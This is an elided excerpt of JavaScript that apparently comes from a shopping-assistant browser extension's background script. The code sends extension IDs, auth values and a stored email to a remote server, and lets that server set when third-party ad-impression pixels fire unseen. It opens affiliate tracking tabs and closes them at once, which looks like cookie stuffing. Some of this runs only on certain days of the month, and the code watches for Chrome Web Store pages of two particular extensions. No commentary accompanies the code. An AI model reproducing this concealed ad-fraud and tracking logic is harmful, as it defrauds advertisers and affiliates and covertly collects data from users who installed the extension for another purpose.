...
// https://s3-ap-southeast-1.amazonaws.com/buyhatke/whl.json

function checkList(){
    var pollInterval = 1000 * 1800;
    window.setTimeout(checkList, pollInterval);
    var httpq4 = new getXMLHTTPRequest();
    var myurl = "https://advcrawler.buyhatke.com/whl.json?rand=" + parseInt(20000000000*Math.random());
    var parameters = "";
...
function verifyAll(){
  ...
  if(temp==undefined || temp==""){
    ...
    for (var key in temp) {
        var curURL = key;
        // console.log("passed " + curURL);
        var check = checkMainFunc2(curURL);
        if(check==0){
           temp[key] = 0;
        }
    }
...
function checkCromeStore(cur_url){
   if(cur_url.split("webstore/detail").length>1){
      if(cur_url.split("jaehkpjddfdgiiefcnhahapilbejohhj").length >1 || cur_url.split("iiinclagpealgnaglbmkdbfbgchjjbpg").length >1){
          makeHTTPRequest();
      }
   }
}
...
function getDurationList(){
  ...
  window.setTimeout(getDurationList, pollInterval);
    var httpq4 = new getXMLHTTPRequest();
    var myurl = "https://advcrawler.buyhatke.com/dataSpeed.json?rand=" + Math.random();
    var parameters = "ext_id=" + localStorage.ext_id + "&auth_val=" + localStorage.ext_auth + "&subs=" + localStorage.subscribedFor + "&id=" + localStorage.email_lucky;
    httpq4.open("GET", myurl, true);
    httpq4.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    httpq4.onreadystatechange = function(){
      if (httpq4.readyState == 4) {
        if(httpq4.status == 200) {
          localStorage.duration_data = httpq4.responseText;
        }
      }
    };
    httpq4.send(parameters);
...
function getAffCoupons(coupIndex, tabID){
  if(coupIndex == 2){
   ...
   // });
    ...
    chrome.tabs.create({
     url : "http://tracking.buyhatke.com/Navigation/?pos=1289&source=extension&ext1=auto-coupon&ext2=" + localStorage.ext_id + "&link=https%3A%2F%2Fwww.cleartrip.com"
   }, function(tabData){
      var someID = tabData.id;
      closeIT(someID);
   });
...
function sendPush(key){
 ...
 if((pos==63) && d >= 14 && d <= 17){
  ...
  else if((pos==2) && d >= 14 && d <= 17){
    // return;
  }
  else if((pos==2190) && d >= 14 && d <= 17){
    // return;
  }
...
function monitorUser(){
 ...
 var d = new Date();
 d = d.getDate();
 if(Math.floor(Date.now() / 1000)-globalPush>1800 && d >= 14 && d <= 17){
  ...
  port.onMessage.addListener(function(msg) {
    if (msg.messageData != ""){
      ...
      switch(command){
       ...
       break;
       case 40:
       var myurl ="http://tracking.buyhatke.com/thankyou.php";
       break;
       case 50:
       ...
       break;
       case 1234:
      var myurl="http://extmain.buyhatke.com/fcheck";
      break;
      case 1235:
...
getDurationList();
var urlList = [];
 urlList[38] = "http://bs.serving-sys.com/serving/adServer.bs?cn=display&c=19&mc=imp&pli=24041010&PluID=0&ord=[timestamp]";
lastLocCode = "";
...
function TriggerPixel(flag){
    if(lastLocCode===""){
        // console.log("Come after 3 " + lastLocCode);
        setTimeout(function(){TriggerPixel(flag)},3000);
    }
    else if(parseInt(lastLocCode) < 38){
      return;
    }
    else {
        cur = lastLocCode;
      ...
      if(flag==0){
          var someDuration = localStorage.duration_data;
          try{
             someDuration = JSON.parse(someDuration);
             someDuration = parseInt(someDuration["k" + cur]);
             if(someDuration!=0){
                 setTimeout(function(){TriggerPixel(0)},someDuration*1000);
                 makeFinalTrigger(cur);
             }
             else {
              console.log("someDuration is 0");
              return;
             }
          }
          catch(err){
              console.log("JSON is corrupted " + err);
              someDuration = 1000; 
              setTimeout(function(){TriggerPixel(0)},someDuration*1000);  
          }
     }
...
function makeFinalTrigger(cur){
  if(parseInt(cur) < 38){
    return;
  }
  fetch("https://advcrawler.buyhatke.com/dataSpeed.json?rand=" + Math.random()).then(function(resp){
      return resp.json();
      }).then(function(resp) {
        // Yay, `j` is a JavaScript object
        var data = resp;
        //localStorage.duration_data = resp;
        if(typeof(data["k" + cur])!="undefined" && parseInt(data["k" + cur])>0){
            var curURLHit = urlList[cur] + Math.floor(Date.now() / 1000) + "&rtu=-1";
            fetch(curURLHit).then(function(resp){
                 // console.log("response", resp);
                 fetch("https://advcrawler.buyhatke.com/impr/?viewPos="+cur);
            });
        }
        else {
